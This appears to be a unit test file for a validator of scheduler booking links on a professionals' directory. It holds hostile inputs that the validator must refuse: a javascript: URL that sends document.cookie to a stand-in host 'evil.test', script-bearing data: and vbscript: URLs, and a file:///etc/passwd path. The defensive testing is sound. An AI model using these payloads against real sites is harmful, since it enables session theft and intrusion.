import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { parseSchedulerLink, explainRejection } from '../src/directory/schedulerLink.ts';

describe('the scheduler link a professional supplies', () => {
  test('accepts the products professionals actually use', () => {
    for (const url of [
      'https://calendly.com/marcus-reyes/30min',
      'https://app.acuityscheduling.com/schedule.php?owner=12345',
      'https://meetings.hubspot.com/donna',
      'https://sternlegal.com/book-a-consultation',
    ]) {
      assert.ok(parseSchedulerLink(url), `${url} should be accepted`);
    }
  });

  test('shows the consumer which site the button leads to', () => {
    assert.equal(parseSchedulerLink('https://www.calendly.com/x')?.host, 'calendly.com');
  });

  test('refuses a javascript: URL — the reason this file exists', () => {
    assert.equal(parseSchedulerLink('javascript:fetch("https://evil.test?c="+document.cookie)'), null);
    assert.equal(parseSchedulerLink('JaVaScRiPt:alert(1)'), null);
  });

  test('refuses other executable and embedded schemes', () => {
    for (const bad of [
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox(1)',
      'file:///etc/passwd',
    ]) {
      assert.equal(parseSchedulerLink(bad), null, `${bad} must be refused`);
    }
  });

  test('refuses plain http rather than silently rewriting it', () => {
    assert.equal(parseSchedulerLink('http://calendly.com/x'), null);
    assert.match(explainRejection('http://calendly.com/x')!, /https:\/\/ rather than http/);
  });

  test('empty, missing and malformed values are simply absent, not errors', () => {
    assert.equal(parseSchedulerLink(undefined), null);
    assert.equal(parseSchedulerLink('   '), null);
    assert.equal(parseSchedulerLink('calendly.com/marcus'), null, 'no protocol is not a URL');
  });

  test('a valid link produces no complaint for the back office', () => {
    assert.equal(explainRejection('https://calendly.com/x'), null);
  });
});
